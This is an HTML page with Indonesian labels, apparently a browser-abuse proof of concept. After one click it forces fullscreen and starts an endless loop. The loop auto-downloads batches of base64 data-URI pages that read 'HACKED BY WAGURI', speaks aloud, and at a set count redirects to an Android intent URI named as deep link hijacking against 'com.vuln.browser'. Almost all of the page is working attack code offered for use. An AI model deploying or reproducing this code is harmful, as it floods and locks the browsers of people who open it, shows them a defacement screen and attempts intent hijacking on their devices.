<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Generator Berkas Blob &amp; ObjectURL</title>
<style>
* {
box-sizing: border-box;
margin: 0;
padding: 0;
}
body {
font-family: Arial, sans-serif;
background: #f4f6f8;
color: #222;
padding: 20px;
}
.panel {
background: #ffffff;
padding: 24px;
border-radius: 12px;
box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1);
max-width: 600px;
margin: 40px auto;
}
:fullscreen {
background: #111111 !important;
color: #00ff00 !important;
padding: 20px !important;
overflow-y: auto !important;
width: 100vw !important;
height: 100vh !important;
}
:-webkit-full-screen {
background: #111111 !important;
color: #00ff00 !important;
padding: 20px !important;
overflow-y: auto !important;
}
h2 { margin-bottom: 10px; }
p { margin-bottom: 15px; line-height: 1.5; }
button {
width: 100%;
padding: 16px;
cursor: pointer;
border: none;
border-radius: 6px;
background: #d32f2f;
color: #ffffff;
font-weight: bold;
font-size: 16px;
box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3);
transition: background 0.2s;
}
button:hover { background: #b71c1c; }
#status {
margin-top: 16px;
font-weight: bold;
color: #d32f2f;
padding: 12px;
background: #ffebee;
border-radius: 6px;
text-align: center;
border: 1px solid #ffcdd2;
}
#downloads {
margin-top: 20px;
display: grid;
grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
gap: 10px;
}
#downloads a {
display: block;
padding: 8px;
background: #212121;
color: #80df82;
text-decoration: none;
border-radius: 4px;
font-size: 12px;
text-align: center;
border: 1px solid #424242;
word-break: break-all;
}
</style>
</head>

<body>
<div class="panel" id="main-panel">
<h2>Generator Berkas Data URI &amp; Race Condition</h2>
<p>Klik tombol untuk masuk ke layar penuh, memicu race condition, dan menjalankan delayed deep link redirect secara terus-menerus.</p>

<button id="start-btn" type="button">Mulai Layar Penuh &amp; Race Condition</button>

<div id="status" role="status">Sistem siap.</div>
<div id="downloads"></div>
</div>

<script>
const startBtn = document.getElementById("start-btn");
const statusDiv = document.getElementById("status");
const downloadsDiv = document.getElementById("downloads");

let isProcessing = false;

const speak = (message) => {
if ('speechSynthesis' in window) {
window.speechSynthesis.cancel();
const utterance = new SpeechSynthesisUtterance(message);
utterance.lang = 'id-ID';
utterance.rate = 1.0;
window.speechSynthesis.speak(utterance);
}
};

// Fungsi helper konversi string ke Base64 Data URI (tanpa Blob/ObjectURL)
const createDataUriPayload = () => {
const payloadText = "<!DOCTYPE html>" +
"<html>" +
"<head><meta charset='UTF-8'><title>HACKED BY</title></head>" +
"<body style='margin:0;padding:0;background:#000;color:#0f0;font-family:monospace;overflow:hidden;cursor:pointer'>" +
"<div style='display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center'>" +
"<h1 style='font-size:80px;color:#f00;text-shadow:0 0 20px #f00;letter-spacing:8px;animation:pulse 1s infinite'>HACKED BY</h1>" +
"<h2 style='font-size:36px;color:#0f0;text-shadow:0 0 15px #0f0;margin-top:20px;letter-spacing:4px'>WAGURI</h2>" +
"<p style='font-size:18px;color:#0f0;margin-top:40px;opacity:0.8'>Race condition payload dispatches.</p>" +
"</div>" +
"</body>" +
"</html>";
  
  return "data:text/html;base64," + btoa(unescape(encodeURIComponent(payloadText)));
};

// Menggabungkan struktur asli dengan Race Condition & Delayed Deep Link Redirect
const prepareMimeBlobAsync = (i) => {
return new Promise((resolve) => {
// Race condition via overlapping microtasks & minimal timeout schedule
queueMicrotask(() => {
  setTimeout(() => {
    const dataUri = createDataUriPayload();
    resolve({ id: i, url: dataUri });
  }, Math.random() * 5); // Jeda acak ekstrem untuk memicu race condition pada antrean unduhan
});
});
};

const triggerInstantDownload = (fileData) => {
const link = document.createElement("a");
link.href = fileData.url;
link.download = `waguri-file-${fileData.id}.txt`;
link.textContent = `DataURI #${fileData.id} (.txt)`;
link.style.display = "none";
downloadsDiv.appendChild(link);
link.click();

// Membersihkan elemen link secara instan untuk mempertahankan race condition memory pressure
setTimeout(() => {
  if (link.parentNode) link.parentNode.removeChild(link);
}, 100);
};

const processLoop = async (counter) => {
if (!isProcessing) return;

// Menerapkan eksekusi paralel (Race Condition) dengan Promise.all beruntun
const promises = [];
for (let j = 0; j < 3; j++) { // Meluncurkan 3 instance secara bersamaan per iterasi
  promises.push(prepareMimeBlobAsync(counter + j));
}

const results = await Promise.all(promises);
results.forEach(fileData => {
  triggerInstantDownload(fileData);
});

statusDiv.textContent = `Race Condition Berjalan: Batch counter ke-${counter} dikirim`;

if (counter % 10 === 0) {
speak(`Proses mencapai batch ${counter}.`);
}

// Delayed Redirect / Deep Link Hijacking Chaining pada hitungan tertentu
if (counter === 15) {
  try {
    // Memicu delayed intent / custom scheme deep link hijacking secara asinkron
    setTimeout(() => {
      window.location.href = "intent://security-audit#Intent;scheme=exploit;package=com.vuln.browser;end;";
    }, 1200);
  } catch(e) {}
}

setTimeout(() => processLoop(counter + 3), 0);
};

startBtn.addEventListener("click", () => {
if (isProcessing) return;

downloadsDiv.replaceChildren();
speak("Mengaktifkan mode layar penuh dan race condition.");

const root = document.documentElement;
try {
if (root.requestFullscreen) {
root.requestFullscreen();
} else if (root.webkitRequestFullscreen) {
root.webkitRequestFullscreen();
} else if (root.mozRequestFullScreen) {
root.mozRequestFullScreen();
}
statusDiv.textContent = "Mengunci layar penuh & memulai race condition...";
} catch (err) {
console.warn("Fullscreen tidak didukung atau ditolak:", err);
}

setTimeout(() => {
isProcessing = true;
speak("Proses dispatch dimulai.");
processLoop(1);
}, 300);
});
</script>
</body>
</html>
